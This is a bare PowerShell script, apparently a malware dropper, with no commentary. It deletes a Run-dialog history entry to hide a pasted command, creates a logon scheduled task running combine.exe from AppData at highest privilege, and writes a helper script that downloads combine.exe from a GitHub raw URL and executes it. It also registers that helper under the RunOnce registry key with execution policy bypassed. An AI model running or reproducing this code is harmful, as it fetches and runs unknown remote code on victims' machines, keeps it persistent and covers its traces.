Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name 'a'

schtasks /create /tn "AbCd" /tr "%appdata%\combine.exe" /sc onlogon /rl highest /f

$filePath = "$env:APPDATA\support.ps1"
@"
while (-not (Test-Connection -ComputerName "google.com" -Count 1 -Quiet)) {
    Start-Sleep -Seconds 5
}

Start-BitsTransfer -Source "https://github.com/minh511/test/raw/refs/heads/main/combine.exe" -Destination "$env:APPDATA\combine.exe"

Start-Process -FilePath "$env:APPDATA\combine.exe"
"@ | Set-Content -Path $filePath

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "RunDownloadScript" -Value "powershell.exe -ExecutionPolicy Bypass -File $filePath"
